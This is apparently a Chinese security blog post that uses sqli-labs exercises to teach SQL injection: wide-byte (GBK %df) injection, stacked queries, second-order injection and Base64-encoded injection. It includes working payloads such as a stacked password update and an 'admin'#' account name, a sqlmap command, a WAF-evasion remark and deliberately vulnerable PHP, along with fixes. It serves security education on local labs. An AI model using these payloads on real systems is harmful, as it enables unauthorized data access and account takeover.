+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>宽字节案例引入</strong>       <br />宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用?id&#x3D;1’ 进行测试的时候，发现提交的单引号会被转义[&#39;]。此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234645934.png" alt="image-20230724234645934"><br />接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了mysql_query(“SET NAMES gbk”)，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234705320.png" alt="image-20230724234705320"><br />仔细看该函数，其利用正则匹配将 [ &#x2F;，’，” ]这些三个符号都过滤掉了<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234717911.png" alt="image-20230724234717911"><br />关于preg_replace的正则用法可详看——&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114642034">命令执行与代码执行漏洞</a> 中搜索preg_replace <br />而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：</p>
+<ol>
+<li>让斜杠（\）失去作用</li>
+<li>让斜杠（\）消失</li>
+</ol>
+<p>第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。<br /><strong>关于编码</strong><br />在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码，可以详看 ——&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/115201653">计算机中的编码问题</a></p>
+<ol>
+<li>某字符的大小为一个字节时，称其字符为窄字节.</li>
+<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
+<li>所有英文默认占一个字节，汉字占两个字节</li>
+<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</li>
+</ol>
+<p><strong>宽字节注入</strong>       <br />宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。<br />由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的<br />我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p>
+<ul>
+<li>‘           %27</li>
+<li>\           %5c</li>
+<li>%df&#39;    %df%5c’ &#x3D;》  運’</li>
+</ul>
+<p>我们输入 ?id&#x3D;1%df’，按道理来说将转义符吃掉了，结果应该是 id&#x3D;’ 運’  ‘ ，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234734448.png" alt="image-20230724234734448"><br />其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，如下就正常了。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234744050.png" alt="image-20230724234744050"><br />联合注入如下<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234757024.png" alt="image-20230724234757024"><br /><strong>GB2312与GBK的不同</strong><br />gb2312和gbk应该都是宽字节家族的一员。但我们来做个小实验。把源码中set names修改成gb2312<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234757024.png"><br />结果就不能注入了，我开始不信，然后再把数据库编码也改成gb2312，也是不成功的。虽然执行的语句还是显示被转换成了中文了，但就是注入不成功<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234820730.png" alt="image-20230724234820730"><br />为什么，这归结于gb2312编码的取值范围。它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。<br />所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。<br /><strong>宽字节注入注入方法</strong><br />1. 黑盒<br />就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如<br />sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-32/?id=1%EF%BF%BD%27">http://localhost/sqli-labs-master/Less-32/?id=1%df%27</a>“<br />2. 白盒<br />查看mysql是否为GBK编码，且是否使用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234820730.png"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234844893.png" alt="image-20230724234844893"> <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234858494.png" alt="image-20230724234858494"><br />如果存在上面说的，则存在宽字节注入。<br /><strong>宽字节注入修复</strong><br />1. mysql_real_escape_string<br />听说这个函数能抵御宽字节注入攻击。mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集。<br />‍于是，把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。但是我们发现还是一样注入成功了<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234858494.png"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234922353.png" alt="image-20230724234922353"><br />为什么，明明我用了mysql_real_escape_string，但却仍然不能抵御宽字符注入？<br />原因就是，你没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍<br />mysqli_set_charset(<em>connection,charset</em>)<em>;</em></p>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>connection</em></td>
+<td>必需。规定要使用的 MySQL 连接。</td>
+</tr>
+<tr>
+<td><em>charset</em></td>
+<td>必需。规定默认字符集。</td>
+</tr>
+</tbody></table>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234946785.png"><br />这样就防止了注入<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234946785.png" alt="image-20230724234946785"><br />即先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string来过滤用户输入。<br />2. 设置参数,character_set_client&#x3D;binary<br />3. 使用utf-8编码<br><a name="kG0hQ"></a></p>
+<h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235100567.png" alt="image-20230724235100567"><br />执行<br />id&#x3D;1’;update users set password&#x3D;’123456’ where id&#x3D;1; –+ <br />意思就是再更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235114479.png" alt="image-20230724235114479"><br /><strong>堆叠查询的局限性</strong><br />堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合)注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br><a name="xjitO"></a></p>
+<h3 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h3><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。</p>
+<ol>
+<li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</li>
+<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li>
+<li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li>
+<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</li>
+<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</li>
+</ol>
+<p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例<br /><strong>sqli-labs less-24</strong><br />1. 如下点击注册用户<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235133751.png" alt="image-20230724235133751"><br />这里注册用户名为 admin’#<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235144682.png" alt="image-20230724235144682"><br />此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235153897.png" alt="image-20230724235153897"><br />2. 对注册的账号进行登录然后修改密码为ccccc<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235207112.png" alt="image-20230724235207112"><br />此时提示密码已经成功修改了<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235218495.png" alt="image-20230724235218495"><br />此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724235228280.png" alt="image-20230724235228280"><br /><strong>漏洞原因</strong><br />1. 在进行用户注册的允许存在’和#这种特殊字符<br />2. 在修改密码页面的源码中，发现这里很明显存在注入漏洞<br />$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’$username’ and password&#x3D;’$curr_pass’ “;<br />当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc<br />$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’#’ and password&#x3D;’$curr_pass’ “;<br><a name="prvVM"></a></p>
+<h3 id="Base64注入攻击"><a href="#Base64注入攻击" class="headerlink" title="Base64注入攻击"></a>Base64注入攻击</h3><p>Base64攻击的测试地址：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/base64.php?id=MQ==%E3%80%82">http://127.0.0.1/sqli/base64.php?id=MQ%3d%3d。</a><br>从URL中可以看出，ID参数经过Base64编码（%3d是&#x3D;的URL编码格式），解码后发现ID为1，尝试加上一个单引号并一起转换成Base64编码，如图59所示。</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213802453.png" alt="image-20230804213802453"></p>
+<p>​                                                                   图59 对1’进行Base64编码</p>
+<p>当访问id&#x3D;1’编码后的网址时（<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/base64.php?id=MSc=%EF%BC%89%EF%BC%8C%E9%A1%B5%E9%9D%A2%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E3%80%821">http://127.0.0.1/sqli/base64.php?id=MSc%3d），页面返回错误。1</a> and 1&#x3D;1和1 and 1&#x3D;2的Base64编码分别为MSBhbmQgMT0x和MSBhbmQgMT0y，再次访问id&#x3D;MSBhbmQgMT0x和id&#x3D;MSBhbmQgMT0y，返回结果如图60和图61所示。</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213826084.png" alt="image-20230804213826084"></p>
+<p>​                                                    图60 访问id&#x3D;MSBhbmQgMT0x的结果 </p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213847939.png" alt="image-20230804213847939"></p>
+<p>​                                                      图61 访问id&#x3D;MSBhbmQgMT0y的结果</p>
+<p>从返回结果可以看到，访问od&#x3D;1 and 1&#x3D;1时，页面返回与id&#x3D;1相同的结果，而访问od&#x3D;1 and 1&#x3D;2时，页面返回与id&#x3D;1不同的结果，所以该网页存在SQL注入漏洞。<br>接着，使用order by查询字段，使用union方法完成此次注入。</p>
+<h4 id="Base64注入代码分析"><a href="#Base64注入代码分析" class="headerlink" title="Base64注入代码分析"></a>Base64注入代码分析</h4><p>在Base64注入页面中，程序获取GET参数ID，利用base_decode()对参数ID进行Base64解码，然后直接将解码后的$id拼接到select语句中进行查询。通过while循环将查询结果输出到页面，代码如下所示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ID:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;user:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br &gt;&quot;</span>;	</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;pass:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now use &quot;</span>.<span class="variable">$sql</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于代码没有过滤解码后的$id，且将$id直接拼接到SQl语句中，所以存在SQL注入漏洞。当访问id&#x3D;1 union select 1,2,3–+（访问时，先进行Base64编码）时，执行的SQL语句为：<br><code>select * from users where id=1 union select 1,2,3--+</code><br>此时SQL语句可以分为select * from users where <code>id</code>&#x3D;1和union select 1,2,3两条，利用第二条语句（Union查询）就可以获取数据库中的数据。<br>这种攻击方式还有其他利用场景，例如，如果有WAF，则WAF会对传输中的参数ID进行检查，但由于传输中的ID经过Base64编码，所以此时WAF很有可能检测不到危险代码，进而绕过了WAF检测。</p>
+<h2 id="六、sql注入getshell的几种方式"><a href="#六、sql注入getshell的几种方式" class="headerlink" title="六、sql注入getshell的几种方式"></a>六、sql注入getshell的几种方式</h2><p>传送门 -》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/116274542">sql注入getshell的几种方式</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Serendipity</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2023/07/23/sql-zhu-ru/">http://example.com/2023/07/23/sql-zhu-ru/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Serendipity</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E5%AE%89/">
+                                    <span class="chip bg-color">网安</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">漏洞</span>
+                                </a>
+                            
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">sql注入</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/07/23/sql-zhu-ru/">
+                    <div class="card-image">
+                        
+                        <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/103.jpg" class="responsive-img" alt="sql注入">
+                        
+                        <span class="card-title">sql注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    sql注入
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E5%AE%89/">
+                        <span class="chip bg-color">网安</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/21/wen-jian-shang-chuan/">
+                    <div class="card-image">
+                        
+                        <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/102.jpg" class="responsive-img" alt="文件上传">
+                        
+                        <span class="card-title">文件上传</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-category">
+                                    文件上传
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E5%AE%89/">
+                        <span class="chip bg-color">网安</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Serendipity</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">32.6k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
